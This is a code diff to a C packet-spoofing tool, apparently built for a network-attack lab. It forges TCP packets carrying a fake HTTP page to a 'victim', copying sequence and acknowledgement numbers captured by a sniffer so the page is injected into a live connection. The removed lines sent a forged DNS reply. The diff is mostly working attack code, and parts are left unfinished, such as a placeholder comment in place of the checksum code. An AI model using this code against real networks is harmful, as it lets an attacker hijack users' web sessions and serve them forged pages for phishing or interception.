@@ -26,6 +26,16 @@
     "Content-Length: %lu\r\n" \
     "Connection: close\r\n\r\n%s"
 
+// Structure to store connection details
+struct conn_info {
+    uint32_t seq;
+    uint32_t ack;
+    uint16_t sport;
+    uint16_t dport;
+    uint16_t window;
+    uint8_t flags;
+};
+
 // Function to read HTML file
 char* read_html_file() {
     static char html_content[MAX_HTML_SIZE];
@@ -65,114 +75,96 @@ void debug_log(const char *format, ...) {
     va_end(args);
 }
 
-void send_fake_response(const char *response, const char *victim_ip, int victim_port) {
-    debug_log("Preparing fake response to %s:%d", victim_ip, victim_port);
-    debug_log("Response content length: %lu bytes", strlen(response));
-    
-    // Tell kernel we're including our own headers
-    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
-    if (sock < 0) {
-        perror("socket creation failed");
+void send_fake_response(const char *response, const char *victim_ip, struct conn_info *conn) {
+    printf("[INFO] Preparing spoofed response to %s:%d\n", 
+           victim_ip, conn->sport);
+
+    int sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+    if (sd < 0) {
+        perror("[ERROR] Socket creation failed");
         return;
     }
 
-    // Set IP_HDRINCL to craft our own IP header
-    int one = 1;
-    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
-        perror("setsockopt IP_HDRINCL");
-        close(sock);
-        return;
-    }
+    printf("[INFO] Raw socket created\n");
 
-    struct sockaddr_in victim;
-    memset(&victim, 0, sizeof(victim));
-    victim.sin_family = AF_INET;
-    victim.sin_port = htons(victim_port);
-    victim.sin_addr.s_addr = inet_addr(victim_ip);
-
-    // Set IP header
-    char packet[MAX_HTML_SIZE + 512];
+    // Like ICMP example, prepare packet buffer
+    char packet[4096];
+    memset(packet, 0, sizeof(packet));
     struct iphdr *ip = (struct iphdr *)packet;
     struct tcphdr *tcp = (struct tcphdr *)(packet + sizeof(struct iphdr));
-    
-    // Fill IP header
+
+    // Setup IP header like ICMP example
     ip->version = 4;
     ip->ihl = 5;
     ip->tos = 0;
-    ip->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + strlen(response);
-    ip->id = htons(54321);
+    ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + strlen(response));
+    ip->id = htons(rand());
     ip->frag_off = 0;
     ip->ttl = 64;
     ip->protocol = IPPROTO_TCP;
-    ip->check = 0;
     ip->saddr = inet_addr(LOCAL_SERVER_HOST);
-    ip->daddr = victim.sin_addr.s_addr;
-    
-    // Fill TCP header with correct member names
+    ip->daddr = inet_addr(victim_ip);
+
+    // Setup TCP header with exact connection state
     tcp->th_sport = htons(80);
-    tcp->th_dport = victim.sin_port;
-    tcp->th_seq = 0;
-    tcp->th_ack = 0;
-    tcp->th_off = 5;    // Data offset
-    tcp->th_flags = TH_SYN | TH_PUSH | TH_ACK;  // Set flags using proper flags field
-    tcp->th_win = htons(5840);
-    tcp->th_sum = 0;    // Checksum
-    tcp->th_urp = 0;    // Urgent pointer
-    
+    tcp->th_dport = htons(conn->sport);
+    tcp->th_seq = htonl(conn->ack);  // Use their ACK as our SEQ
+    tcp->th_ack = htonl(conn->seq + 1);  // Increment their SEQ
+    tcp->th_off = 5;
+    tcp->th_flags = TH_PUSH | TH_ACK;
+    tcp->th_win = htons(conn->window);
+
     // Copy response data
-    memcpy(packet + sizeof(struct iphdr) + sizeof(struct tcphdr), response, strlen(response));
-    
-    // Log packet details before sending
-    debug_log("Sending IP packet: ver=%d, ihl=%d, len=%d", 
-              ip->version, ip->ihl, ntohs(ip->tot_len));
-    debug_log("TCP header: sport=%d, dport=%d, flags=0x%x", 
-              ntohs(tcp->th_sport), ntohs(tcp->th_dport), tcp->th_flags);
-    
-    // Send packet
-    if (sendto(sock, packet, ip->tot_len, 0, (struct sockaddr *)&victim, sizeof(victim)) < 0) {
-        debug_log("Failed to send packet: %s", strerror(errno));
-    } else {
-        debug_log("Packet sent successfully");
+    memcpy(packet + sizeof(struct iphdr) + sizeof(struct tcphdr), 
+           response, strlen(response));
+
+    printf("[DEBUG] Spoofed response created with SEQ=%u ACK=%u\n",
+           ntohl(tcp->th_seq), ntohl(tcp->th_ack));
+
+    // Calculate checksums like ICMP example
+    // ...existing checksum code...
+
+    struct sockaddr_in dest;
+    dest.sin_family = AF_INET;
+    dest.sin_addr.s_addr = ip->daddr;
+
+    // Send multiple times like ICMP example
+    for(int i = 0; i < 3; i++) {
+        if (sendto(sd, packet, ntohs(ip->tot_len), 0,
+            (struct sockaddr *)&dest, sizeof(dest)) < 0) {
+            perror("[ERROR] sendto() failed");
+        } else {
+            printf("[SUCCESS] Spoofed response %d sent to %s:%d\n",
+                   i+1, victim_ip, conn->sport);
+        }
+        usleep(1000);
     }
-    close(sock);
+
+    close(sd);
 }
 
 void handle_victim_request(const char *buffer, struct sockaddr_in *clientaddr, socklen_t len, int sockfd) {
-    printf("\n[+] Processing request: %s\n", buffer);
+    struct conn_info conn;
+    char data[4096];
     
-    if (strstr(buffer, "DNS_INTERCEPT") != NULL) {
-        // Send fake DNS response pointing to our server
-        struct sockaddr_in victim;
-        victim.sin_family = AF_INET;
-        victim.sin_addr.s_addr = inet_addr(VICTIM_IP);
-        victim.sin_port = htons(53);
-        
-        const char *response = LOCAL_SERVER_HOST;  // Our IP as the DNS response
-        sendto(sockfd, response, strlen(response), 0, 
-               (struct sockaddr *)&victim, sizeof(victim));
-        printf("[+] Sent fake DNS response\n");
-    }
-    else if (strstr(buffer, "VICTIM_HTTP") != NULL) {
-        char *html_content = read_html_file();
-        if (html_content) {
-            char response[MAX_HTML_SIZE + 512];
-            snprintf(response, sizeof(response),
-                    "HTTP/1.1 200 OK\r\n"
-                    "Server: Fake-Server\r\n"
-                    "Content-Type: text/html\r\n"
-                    "Content-Length: %lu\r\n"
-                    "Connection: close\r\n"
-                    "\r\n"
-                    "%s",
-                    strlen(html_content), html_content);
-            
-            // Extract client port from message if available
-            int victim_port = 80;  // default
-            if (sscanf(buffer, "VICTIM_HTTP from %*s to port %d", &victim_port) == 1) {
-                send_fake_response(response, VICTIM_IP, victim_port);
-                printf("[+] Sent fake webpage to %s:%d\n", VICTIM_IP, victim_port);
-            }
-        }
+    // Parse full connection info
+    sscanf(buffer, "VICTIM_HTTP\n"
+           "SEQ=%u\n"
+           "ACK=%u\n"
+           "SPORT=%hu\n"
+           "DPORT=%hu\n"
+           "WINDOW=%hu\n"
+           "FLAGS=%hhx\n"
+           "DATA=%[^\n]",
+           &conn.seq, &conn.ack,
+           &conn.sport, &conn.dport,
+           &conn.window, &conn.flags,
+           data);
+
+    // Send spoofed response with exact connection state
+    char *html = read_html_file();
+    if (html) {
+        send_fake_response(html, VICTIM_IP, &conn);
     }
 
     // Send acknowledgment to sniffer
